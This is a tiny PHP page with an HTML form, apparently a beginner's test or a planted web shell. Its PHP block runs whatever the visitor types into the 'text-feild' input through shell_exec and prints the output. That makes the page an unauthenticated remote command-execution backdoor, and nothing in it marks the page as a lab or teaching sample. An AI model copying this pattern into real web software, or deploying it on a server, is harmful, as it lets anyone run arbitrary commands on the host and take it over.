<?php 

if (isset($_GET['submit'])) {
	echo shell_exec($_GET['text-feild']);
	#echo $_GET['text-feild'];
	#phpinfo();	
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
    <div class="row"> How are you guysssss </div>
    
    <div class="register">
    	<form action="./index.php" method="GET">
    		<label> type something plz </label>
    		<input type="text" name="text-feild">

    		<input type="submit" name="submit">
    	</form>
    </div>
  </body> 
</html>